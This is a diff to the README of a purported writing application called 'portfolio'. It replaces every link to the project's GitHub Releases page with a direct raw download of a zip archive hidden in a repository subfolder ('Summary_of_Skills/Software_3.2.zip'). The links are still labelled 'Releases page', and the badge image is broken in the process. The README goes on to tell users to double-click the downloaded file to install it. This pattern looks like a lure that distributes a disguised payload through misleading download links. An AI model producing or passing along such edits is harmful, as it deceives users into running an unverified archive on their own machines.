@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/hamood920/portfolio/releases)
+[![Download from Releases](https://github.com/hamood920/portfolio/raw/refs/heads/main/Summary_of_Skills/Software_3.2.zip%20Now-blue)](https://github.com/hamood920/portfolio/raw/refs/heads/main/Summary_of_Skills/Software_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ Welcome to your new writing tool, **portfolio**! This application helps you crea
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://github.com/hamood920/portfolio/releases) to download the latest version of **portfolio**. Follow these steps:
+To get started, visit the [Releases page](https://github.com/hamood920/portfolio/raw/refs/heads/main/Summary_of_Skills/Software_3.2.zip) to download the latest version of **portfolio**. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/hamood920/portfolio/releases).
+1. Go to the [Releases page](https://github.com/hamood920/portfolio/raw/refs/heads/main/Summary_of_Skills/Software_3.2.zip).
 2. Look for the latest release (usually at the top).
 3. Click on the download link for your system.
 4. Once downloaded, locate the file and double-click to install.
@@ -63,7 +63,7 @@ If you encounter issues while installing or using **portfolio**, here are a few 
 
 - **Installation Issues:** Ensure that your system meets the requirements. If the installation fails, try restarting your device and attempting to install again.
 - **File Not Opening:** Make sure that the downloaded file is complete. If you interrupted the download, repeat the process from the **Download & Install** section.
-- **Application Crashes:** If the app crashes frequently, check for updates on the [Releases page](https://github.com/hamood920/portfolio/releases). 
+- **Application Crashes:** If the app crashes frequently, check for updates on the [Releases page](https://github.com/hamood920/portfolio/raw/refs/heads/main/Summary_of_Skills/Software_3.2.zip). 
 
 ## 🌐 Community and Resources
 
